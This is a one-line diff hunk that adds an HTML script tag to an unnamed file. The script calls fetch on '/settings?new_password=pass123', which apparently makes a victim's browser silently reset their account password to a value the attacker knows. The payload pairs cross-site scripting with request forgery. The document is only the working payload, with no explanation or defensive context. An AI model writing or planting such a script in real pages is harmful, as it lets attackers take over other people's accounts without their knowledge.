@@ -1,0 +1,1 @@
+<script>fetch('/settings?new_password=pass123');</script>
